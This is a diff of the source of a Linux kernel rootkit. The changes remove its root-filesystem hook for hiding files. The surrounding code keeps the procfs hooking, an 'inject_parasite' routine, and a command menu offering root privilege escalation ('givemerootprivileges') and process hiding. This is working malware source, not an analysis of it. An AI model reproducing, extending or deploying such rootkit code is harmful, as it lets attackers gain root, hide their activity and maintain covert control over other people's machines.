@@ -86,11 +86,9 @@ struct hidden_pids
 
 
 static int filesystem_procfs_hook_iterate(struct file *,struct dir_context *);
-static int filesystem_rootfs_hook_iterate(struct file *,struct dir_context *);
 
 
 static int procfs_filldir(void *,const char *,int,loff_t,u64,unsigned int);
-static int rootfs_filldir(void *,const char *,int,loff_t,u64,unsigned int);
 
 
 static int 	procfs_entry_init(void);
@@ -108,10 +106,8 @@ static void unhook_func(void);
 static void hide_proc(void);
 
 static int (*struct_procfs_iterate)(struct file *fp,struct dir_context *ctx);
-static int (*struct_rootfs_iterate)(struct file *fp,struct dir_context *ctx);
 
 static filldir_t struct_procfs_filldir;
-static filldir_t struct_rootfs_filldir;
 
 LIST_HEAD(hidden_pids_listhead);
 
@@ -234,7 +230,6 @@ static ssize_t procfs_read(struct file *fp,
 				"\t* [givemerootprivileges] -->> to gain root access\n"
 				"\t* [hidepidPID] -->> to hide a given pid. replace (PID) with target pid\n"
 				"\t* [unhidepidPID] -->> to unhide a given pid. replace (PID) with target pid\n"
-				"\t* [hidingfiles] -->> just prepend lilyofthevalley to the file or dir name that u want to hide\n"
 				"\x00";
 
 	if (copy_to_user(buf,rootkit_cmds,strlen(rootkit_cmds)))
@@ -367,7 +362,6 @@ static void unhook_func()
 	struct hooked_function *current_hooked,*next_hooked;
 
 	inject_parasite(struct_procfs_iterate,REMOVE_PARASITE);
-	inject_parasite(struct_rootfs_iterate,REMOVE_PARASITE);
 
 	//free the list of hooked functions
 	list_for_each_entry_safe(current_hooked,next_hooked,&hooked_functions_listhead,hook_list)
